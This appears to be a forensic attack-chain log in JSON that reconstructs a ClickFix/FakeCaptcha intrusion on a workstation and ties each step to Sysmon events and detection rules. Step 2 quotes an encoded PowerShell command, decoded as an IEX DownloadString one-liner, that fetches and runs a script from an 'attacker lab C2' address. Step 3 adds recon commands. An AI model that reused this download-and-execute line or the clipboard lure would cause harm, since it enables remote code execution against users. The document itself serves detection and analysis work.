    {"step": 1, "tactic": "Initial Access / Social Engineering (ClickFix)", "technique": "T1204.002", "what_happened": "At 2026-05-13 14:20:15 CEST, user CORP\\jdupont on workstation WIN-WKS-114 (10.108.42.37) visited an attacker-controlled website delivering a FakeCaptcha/ClickFix page. The page instructed the user to press Win+R and paste a command from the clipboard. The JavaScript on the page had pre-loaded the clipboard via ClipboardData API with an encoded PowerShell one-liner.", "chain_reason": "Social engineering via ClickFix/FakeCaptcha lure — no exploit involved; the user is the execution vector. The browser clipboard write primes the payload before the user opens the Run dialog.", "first_seen": "2026-05-13T14:20:15+0200"},
    {"step": 2, "tactic": "Execution — Run Dialog Payload", "technique": "T1204.002", "what_happened": "At 14:21:03 CEST, Sysmon Event 1 fired on WIN-WKS-114: process powershell.exe was created with parentImage=C:\\Windows\\explorer.exe. This parent-child relationship is the defining ClickFix signature — explorer.exe spawns a shell exclusively when a user pastes and submits a command in the Win+R Run dialog. CommandLine: powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwADgALgA1ADcALgAxADgANAAvAHMAZQBjAHIAZQB0ACcAKQA=". The base64 decodes to: IEX (New-Object Net.WebClient).DownloadString('http://10.108.57.184/secret'). This is a remote download-and-execute one-liner targeting the attacker C2.", "chain_reason": "Sysmon EID 1 on WIN-WKS-114: image=powershell.exe, parentImage=explorer.exe, commandLine contains -EncodedCommand. Rule 92811 fired 'PowerShell execution via Run dialog'. RunMRU registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU updated with the pasted command — forensic artifact confirming Win+R vector.", "first_seen": "2026-05-13T14:21:03+0200"},
    {"step": 3, "tactic": "Execution — Encoded Payload Staging", "technique": "T1059.001", "what_happened": "At 14:22:09 CEST, the powershell.exe process initiated an outbound HTTP GET to 10.108.57.184/secret (attacker lab C2). The downloaded script was immediately executed in memory via IEX (Invoke-Expression) without touching disk — fileless execution. Sysmon EID 1 recorded a child process cmd.exe spawned from powershell.exe with commandLine 'cmd.exe /c whoami && ipconfig /all', consistent with initial post-exploitation reconnaissance.", "chain_reason": "Sysmon EID 1 chain: explorer.exe → powershell.exe (-EncodedCommand IEX DownloadString) → cmd.exe (whoami + ipconfig). Rule 92812 fired 'Clipboard-based payload execution (ClickFix)' at critical severity.", "first_seen": "2026-05-13T14:22:09+0200"},
